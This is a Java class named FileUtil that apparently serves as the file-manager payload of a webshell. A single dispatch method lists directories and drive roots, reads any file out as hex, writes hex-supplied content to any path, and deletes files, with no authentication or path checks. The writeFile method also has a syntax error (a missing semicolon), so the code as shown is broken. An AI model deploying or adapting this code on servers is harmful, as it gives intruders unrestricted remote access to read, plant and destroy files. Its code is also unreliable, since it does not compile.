import java.io.*;
import java.text.SimpleDateFormat;

public class FileUtil extends Object {
    public static String run(String methodName, String params, String encoding) {
        String r = "";
        if (methodName.equalsIgnoreCase("listfile")) {
            r = FileUtil.listfile(params, encoding);
        } else if (methodName.equalsIgnoreCase("getpath")) {
            r = FileUtil.getPath();
        } else if (methodName.equalsIgnoreCase("readfile")) {
            r = FileUtil.readFile(params);
        }else if (methodName.equalsIgnoreCase("writefile")) {
            String fp = params.substring(0, params.indexOf("^"));
            String fc = params.substring(params.indexOf("^") + 1);
            r = FileUtil.writeFile(fp,fc);
        } else if (methodName.equalsIgnoreCase("listdiver")) {
            r = WwwRootPathCode();
        } else if (methodName.equalsIgnoreCase("deletefile")) {
            r = deleteFile(params);
        } else {
            r = "unkown methodName";
        }
        return r;
    }

    public static String WwwRootPathCode() {
        String d = System.getProperty("user.dir");
        StringBuilder s = new StringBuilder();
        if (!d.startsWith("/")) {
            try {
                File[] roots = File.listRoots();
                for (File root : roots) {
                    s.append(root.toString(), 0, 2);
                }
            } catch (Exception e) {
                s.append("/");
            }
        } else {
            s.append("/");
        }
        return s.toString();
    }

    public static String listfile(String dirPath, String encoding){
        if (encoding == null || encoding.equals("")) {
            encoding = "utf-8";
        }
        String r = "";
        try {
            File oF = new File(dirPath), l[] = oF.listFiles();
            String s = "", sT, sQ, sF = "";
            java.util.Date dt;
            String fileCode=(String)System.getProperties().get("file.encoding");
            SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            for (int i = 0; i < l.length; i++) {
                dt = new java.util.Date(l[i].lastModified());
                sT = fm.format(dt);
                sQ = l[i].canRead() ? "R" : "";
                sQ += l[i].canWrite() ? " W" : "";
                if("".equals(sQ)){
                    sQ = "Unknown";
                }
                String nm = new String(l[i].getName().getBytes(fileCode), encoding);
                if (l[i].isDirectory()) {
                    s += nm + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
                } else {
                    sF += nm + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
                }
            }
            s += sF;
            r = new String(s.getBytes(fileCode), encoding);
        }catch (Exception e){
            return e.getMessage();
        }
        return r;
    }
    public static String getPath() {
        String result = "";
        File directory = new File("");
        try {
            result = directory.getAbsolutePath();
        } catch (Exception e) {
            return e.getMessage();
        }
        return result;
    }

    public static String readFile(String filePath){
        StringBuffer sb = new StringBuffer();
        DataInputStream input = null;
        try {
            input = new DataInputStream(new FileInputStream(filePath));
            while (input.available() > 0) {
                String hex = String.format("%02x", input.readByte() & 0xFF);
                sb.append(hex);
            }
        } catch (Exception e) {
            sb.append(e.toString());
        }
        //System.out.println(sb.toString());
        return sb.toString();
    }

    public static String writeFile(String filePath, String fileContext){
        String r = "ok";
        try {
            String h = "0123456789ABCDEF";
            String fileHexContext = fileContext;
            File f = new File(filePath);
            FileOutputStream os = null;
            os = new FileOutputStream(f);
            for (int i = 0; i < fileHexContext.length(); i += 2) {
                os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
            }
            os.close();
        } catch (Exception e) {
            return e.getMessage()
        }
        return r;
    }

    public static String deleteFile(String path) {
        StringBuffer sb = new StringBuffer();
        File f = new File(path);
        if (f.exists()) {
            if (f.delete()) {
                sb.append("success");
            } else {
                sb.append("fail");
            }
        } else {
            sb.append("error");
        }
        return sb.toString();
    }
}